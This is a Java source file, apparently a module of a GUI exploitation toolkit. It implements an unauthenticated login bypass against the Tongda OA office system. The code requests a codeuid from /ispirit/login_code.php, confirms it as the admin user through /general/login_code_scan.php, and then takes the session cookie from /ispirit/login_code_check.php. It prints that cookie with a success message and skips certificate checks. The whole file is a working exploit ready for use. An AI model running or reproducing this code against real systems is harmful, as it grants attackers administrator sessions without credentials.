package exp.oa.tongdaoa;

import com.alibaba.fastjson.JSON;
import com.github.kevinsawicki.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;

import java.util.HashMap;

public class tongda_AnyUserLogin_unauth implements Exploitlnterface {
    private static String path;//漏洞 path地址
    private static String codeuid;//codeuid参数
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(()-> {
            textArea.appendText("\n 未授权访问需替换cookie");
            textArea.appendText("\n ");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String getCookie(String url){
        path="/ispirit/login_code.php";
        //获取codeuid
//        HttpTools.get(url+path,new HashMap<>(),"utf-8");
        HttpRequest codeuidRequest = HttpRequest.get(url + path).trustAllHosts().trustAllCerts();
        if (codeuidRequest.code()==200){
            codeuid= JSON.parseObject(codeuidRequest.body()).get("codeuid").toString();
        }else {
            return null;
        }

        //校验codeuid
        path="/general/login_code_scan.php";
//        HttpTools.post(url+path,"codeuid=" + codeuid + "&source=pc&uid=1&type=confirm&username=admin",new HashMap<>(),"utf-8");
        HttpRequest checkCodeuidRequest = HttpRequest.post(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .send("codeuid=" + codeuid + "&source=pc&uid=1&type=confirm&username=admin");
        String status=JSON.parseObject(checkCodeuidRequest.body()).get("status").toString();
        if (status.equals("1")){
            //获取cookie
            path = "/ispirit/login_code_check.php?codeuid="+codeuid;

            HttpRequest cookieRequest=HttpRequest.get(url+path)
                    .trustAllHosts()
                    .trustAllCerts();
            String cookie=cookieRequest.header("Set-Cookie").split(";")[0];
            return cookie;
        }else {
            return null;
        }
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        if(getCookie(url)!=null){
            Platform.runLater(()-> {
                textArea.appendText("\n [ tongda_AnyUserLogin_unauth ]");
                textArea.appendText("\n 登录认证绕过成功");
                textArea.appendText("\n url: "+url+"/pda/main.php");
                textArea.appendText("\n Cookie: "+getCookie(url));
                textArea.appendText("\n ");
            });
            return true;
        }else {
            Platform.runLater(()-> {
                textArea.appendText("\n 登录认证绕过失败");
                textArea.appendText("\n ");
            });
            return false;
        }
    }
}
